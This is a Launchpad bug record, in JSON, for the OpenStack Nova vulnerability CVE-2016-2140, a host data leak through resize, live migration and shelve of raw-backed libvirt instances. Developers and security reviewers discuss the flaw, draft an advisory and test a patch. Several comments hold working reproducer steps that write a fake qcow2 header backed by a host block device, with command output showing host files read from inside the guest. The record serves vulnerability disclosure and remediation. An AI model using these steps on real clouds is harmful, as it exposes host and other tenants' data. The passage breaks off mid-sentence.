@@ -1,0 +1,379 @@
+{
+    "status": "Fix Released", 
+    "last_updated": "2017-06-16 12:12:24.753467+00:00", 
+    "description": "First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.\n\nWhen resizing an instance using the libvirt driver, we run LibvirtDriver.migrate_disk_and_power_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for info in disk_info:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# assume inst_base == dirname(info['path'])\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0...\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0copy the disk\n\nNote that this doesn't copy disk.info, because it's not a disk. I have actually confirmed this whilst investigating another bug.\n\nThe problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.\n\nI am moderately confident that this is a real bug.\n\nUnlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven't disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn't worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn't common.\n\nGiven that I don't think it's all that serious in practise, I'm not going to work on this immediately as I don't have the time. If it's still around when I'm less busy I'll pick it up.", 
+    "tags": [
+        "in-stable-kilo", 
+        "in-stable-liberty"
+    ], 
+    "importance": "Critical", 
+    "heat": 18, 
+    "link": "https://bugs.launchpad.net/nova/+bug/1548450", 
+    "owner": "https://api.launchpad.net/1.0/~lyarwood", 
+    "id": 1548450, 
+    "index": 274, 
+    "created": "2016-02-22 18:14:34.238448+00:00", 
+    "title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", 
+    "comments": [
+        {
+            "content": "First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.\n\nWhen resizing an instance using the libvirt driver, we run LibvirtDriver.migrate_disk_and_power_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:\n\n            for info in disk_info:\n                # assume inst_base == dirname(info['path'])\n                ...\n                copy the disk\n\nNote that this doesn't copy disk.info, because it's not a disk. I have actually confirmed this whilst investigating another bug.\n\nThe problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.\n\nI am moderately confident that this is a real bug.\n\nUnlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven't disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn't worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn't common.\n\nGiven that I don't think it's all that serious in practise, I'm not going to work on this immediately as I don't have the time. If it's still around when I'm less busy I'll pick it up.", 
+            "date_created": "2016-02-22 18:14:34.238448+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.\n\nSo IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?", 
+            "date_created": "2016-02-22 19:23:40.799490+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Here's a theoretical reproducer, which *I HAVE NOT TESTED*:\n\nA system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.\n\nThere is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.\n\nBecause the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.", 
+            "date_created": "2016-02-23 10:07:51.113614+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.", 
+            "date_created": "2016-02-23 10:36:34.666757+00:00", 
+            "author": "https://api.launchpad.net/1.0/~berrange"
+        }, 
+        {
+            "content": "Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.", 
+            "date_created": "2016-02-23 10:44:17.397964+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.", 
+            "date_created": "2016-02-23 10:48:21.013472+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.", 
+            "date_created": "2016-02-23 12:00:18.801964+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :\n\n- Image and flavor configuration :\n\n# wget https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86_64/Images/Fedora-Cloud-Base-23-20151030.x86_64.qcow2\n# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86_64.qcow2 --disk-format qcow2 --container-format bare --progress\n# nova flavor-create eph 6 512 5 1 --ephemeral 1\n# nova flavor-create eph_large 7 768 5 1 --ephemeral 1\n\n- Ensure use_cow_images is False on all compute hosts :\n\n# openstack-config --get /etc/nova/nova.conf libvirt use_cow_images\nFalse\n\n- Boot an instance using the fedora image and a small ephemeral disk :\n\n# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot\n\nroot@host # ps aux | grep qemu\nqemu     18725 93.7  9.4 1421432 751232 ?      Rl   14:00   6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on\n\n- Confirm the block layout within the guest and umount the formatted ephemeral disk :\n\nroot@guest # lsblk\nNAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT\nvda    252:0    0   5G  0 disk \n\u2514\u2500vda1 252:1    0   5G  0 part /\nvdb    252:16   0   1G  0 disk /mnt\nroot@guest # umount /mnt\n\n- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :\n\nroot@guest # qemu-img create -f qcow2 -o backing_file=/dev/sda3,backing_fmt=raw /dev/vdb 20G\nFormatting '/dev/vdb', fmt=qcow2 size=21474836480 backing_file='/dev/sda3' backing_fmt='raw' encryption=off cluster_size=65536 lazy_refcounts=off refcount_bits=16\n\nroot@guest # qemu-img info /dev/vdb\nimage: /dev/vdb\nfile format: qcow2\nvirtual size: 20G (21474836480 bytes)\ndisk size: 0\ncluster_size: 65536\nbacking file: /dev/sda3\nbacking file format: raw\nFormat specific information:\n    compat: 1.1\n    lazy refcounts: false\n    refcount bits: 16\n    corrupt: false\n\n- Now request a resize of the instance :\n\n# nova resize d56b9bf3-f3b0-4d76-952b-5015b43babcd 7\n\n- Once complete confirm the qemu-kvm command line used to launch the instance, note the qcow2 format for the ephemeral disk :\n\nroot@host # ps aux | grep qemu\nqemu     20762 99.8  5.5 1859748 436596 ?      Rl   14:11   0:22 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 768 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=599d7700-3d4b-1543-8882-f4ec4901c043,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on\n\n- Again within the guest confirm the block layout, note that there is now a 20G device mounted under /mnt :\n\nroot@guest # lsblk\nNAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT\nvda    252:0    0   5G  0 disk \n\u2514\u2500vda1 252:1    0   5G  0 part /\nvdb    252:16   0  20G  0 disk /mnt\n\n- As we have full access to the block device we can gain access not only to files on the host but potentially other instances as well :\n\nroot@guest # cat /mnt/etc/redhat-release \nRed Hat Enterprise Linux Server release 7.2 (Maipo)\n\nroot@guest # qemu-img info /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0 \nimage: /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0\nfile format: qcow2\nvirtual size: 20G (21474836480 bytes)\ndisk size: 1.0G\ncluster_size: 65536\nbacking file: /dev/sda3\nbacking file format: raw\nFormat specific information:\n    compat: 1.1\n    lazy refcounts: false\n    refcount bits: 16\n    corrupt: false\n\nroot@host # lsblk\nNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nsda      8:0    0   20G  0 disk \n\u251c\u2500sda1   8:1    0  512M  0 part /boot\n\u251c\u2500sda2   8:2    0    1G  0 part [SWAP]\n\u2514\u2500sda3   8:3    0 18.5G  0 part /\n", 
+            "date_created": "2016-02-23 19:37:52.033347+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...", 
+            "date_created": "2016-02-23 19:58:09.707307+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Impact description draft #1 (assuming write access):\n\nTitle: Nova host data access through resize/migration\nReporter: Matthew Booth (Red Hat)\nProducts: Nova\nAffects: <=2015.1.2, >=12.0.0 <=12.0.1\n\nDescription:\nMatthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting \"use_cow_images = False\" (not default) are affected.", 
+            "date_created": "2016-02-23 20:19:07.300483+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note. ", 
+            "date_created": "2016-02-23 20:23:52.357059+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.\n\nImpact description draft #2:\n\nTitle: Nova host data leak through resize/migration\nReporter: Matthew Booth (Red Hat)\nProducts: Nova\nAffects: <=2015.1.2, >=12.0.0 <=12.0.1\n\nDescription:\nMatthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting \"use_cow_images = False\" (not default) are affected.\n", 
+            "date_created": "2016-02-23 20:50:40.249191+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.", 
+            "date_created": "2016-02-24 12:07:55.384294+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "At first glance, I think live migration is vulnerable. pre_live_migration runs on the destination host, and runs _create_images_and_backing() without having copied over disk.info. _create_images_and_backing is passed disk_info (not to be confused with disk.info) which was originally generated by libvirt.get_instance_disk_info on the source host. This disk_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.\n\nIf the user reboots, _hard_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt._get_guest_disk_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct_format(), which calls resolve_driver_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.\n\nLong story short: pre_live_migration should probably also copy disk.info.", 
+            "date_created": "2016-02-24 12:38:03.058346+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :\n\nroot@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info \n{\"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk\": \"raw\", \"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0\": \"raw\"}\n\nroot@guest # lsblk\nNAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT\nvda    252:0    0   5G  0 disk \n\u2514\u2500vda1 252:1    0   5G  0 part /\nvdb    252:16   0   1G  0 disk /mnt\n\nroot@guest # umount /mnt\n\nroot@guest # qemu-img create -f qcow2 -o backing_file=/dev/sda3,backing_fmt=raw /dev/vdb 20G\nFormatting '/dev/vdb', fmt=qcow2 size=21474836480 backing_file='/dev/sda3' backing_fmt='raw' encryption=off cluster_size=65536 lazy_refcounts=off refcount_bits=16\n[root@test-live-migrate ~]# lsblk\nNAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT\nvda    252:0    0   5G  0 disk \n\u2514\u2500vda1 252:1    0   5G  0 part /\nvdb    252:16   0   1G  0 disk \n\nroot@guest # qemu-img info /dev/vdb \nimage: /dev/vdb\nfile format: qcow2\nvirtual size: 20G (21474836480 bytes)\ndisk size: 0\ncluster_size: 65536\nbacking file: /dev/sda3\nbacking file format: raw\nFormat specific information:\n    compat: 1.1\n    lazy refcounts: false\n    refcount bits: 16\n    corrupt: false\n\n# nova live-migration --block-migrate test-live-migrate\n\nroot@destination # ps aux | grep qemu\nqemu     17656 10.6  3.3 1236024 262832 ?      Sl   09:20   0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]\n\nroot@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info \n{\"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk\": \"raw\", \"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0\": \"qcow2\"}\n\n# nova reboot --hard test-live-migrate\n\nroot@destination # ps aux | grep qemu\nqemu     18684  101  4.1 1209396 326928 ?      Sl   09:23   0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]\n\n\nroot@guest # lsblk\nNAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT\nvda    252:0    0   5G  0 disk \n\u2514\u2500vda1 252:1    0   5G  0 part /\nvdb    252:16   0  20G  0 disk /mnt\n\nroot@guest # ll /mnt/etc/redhat-release \n-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release\n\n", 
+            "date_created": "2016-02-24 14:30:38.432744+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...\n\nLee, any chance you try the hard-reboot case as described in comment #13 ?\n\nTo sum-up, the disk info needs to be copied in pre_live_migration, migrate_disk_and_power_off  and _hard_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?", 
+            "date_created": "2016-02-24 20:52:43.827250+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM. ", 
+            "date_created": "2016-02-25 08:57:05.178886+00:00", 
+            "author": "https://api.launchpad.net/1.0/~berrange"
+        }, 
+        {
+            "content": "Lee has a patch which reconstructs it from the confusingly similar disk_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.", 
+            "date_created": "2016-02-25 10:22:24.787706+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Tristan, just to be clear the --hard reboot case described in c#13 is _after_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.", 
+            "date_created": "2016-02-25 13:39:31.844908+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.", 
+            "date_created": "2016-02-25 13:53:45.836591+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.\n\nAlternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.", 
+            "date_created": "2016-02-25 15:11:30.509992+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...\n\nTalking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.\n\nIn general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.", 
+            "date_created": "2016-02-25 17:09:58.053244+00:00", 
+            "author": "https://api.launchpad.net/1.0/~danms"
+        }, 
+        {
+            "content": "Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst_base to inst_base + '_resize' before copying only the images back into inst_base. inst_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory.  Again apologies for the confusion.", 
+            "date_created": "2016-02-25 17:17:49.180426+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "It seems like backing_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.\n\nHow hard would it be to cut off that case entirely?", 
+            "date_created": "2016-02-25 17:24:22.179910+00:00", 
+            "author": "https://api.launchpad.net/1.0/~sdague"
+        }, 
+        {
+            "content": "I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.\n\nI also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.", 
+            "date_created": "2016-02-25 17:46:30.444370+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "Sean, come talk to me at summit. We'll get along just fine :)\n\nSeriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: https://bugs.launchpad.net/nova/+bug/1547582 .\n\nMy libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.", 
+            "date_created": "2016-02-25 17:57:22.308953+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that  is pretty much is always unsafe.  I'm fine with that being a patch we do later though.\n\nThe patch from Lee looks reasonable to me.", 
+            "date_created": "2016-02-25 18:12:19.948078+00:00", 
+            "author": "https://api.launchpad.net/1.0/~berrange"
+        }, 
+        {
+            "content": "Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving  process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.", 
+            "date_created": "2016-02-25 19:15:24.202269+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.\n\n", 
+            "date_created": "2016-02-25 19:39:53.532549+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using \"patch -p2\":\npatching file virt/libvirt/driver.py\nHunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).\nHunk #2 FAILED at 7195.\n\nThe failed hunk contains unresolved symbols: on_execute, on_completion and compression that needs to be removed.", 
+            "date_created": "2016-02-25 21:59:55.820749+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "And it seems like the shelve issue is real and not fixed by the propose patch.\nAfter overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:\n\n 7084 ?        Ssl    1:05 /usr/bin/python /usr/bin/nova-compute\n11792 ?        Sl     2:40  \\_ qemu-img convert -f qcow2 -O qcow2   \\\n  /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \\\n  /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61\n\n# openstack-config --get /etc/nova/nova.conf libvirt use_cow_images\nFalse\n\n# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk\nimage: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk\nfile format: qcow2\nvirtual size: 100G (107374182400 bytes)\ndisk size: 5.0G\ncluster_size: 65536\nbacking file: /dev/vda1\nbacking file format: raw\nFormat specific information:\n    compat: 1.1\n    lazy refcounts: false\n\n\n# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61\nimage: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61\nfile format: qcow2\nvirtual size: 100G (107374182400 bytes)\ndisk size: 7.5G\ncluster_size: 65536\nFormat specific information:\n    compat: 1.1\n    lazy refcounts: false\n\n\nThe snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.", 
+            "date_created": "2016-02-26 00:50:44.613281+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Sean, Dan B,\n\nThe first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info *before* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.\n\nThere is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.\n\nThe problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:\n\n1. What the expected format is of the image that it is downloading.\n2. That it is even downloading an image at all.\n\nIts only option with the current structure is to call the callback and test what it got. My series splits this into create_from_func() for ephemeral and swap disks, and create_from_image() for images. This gives the 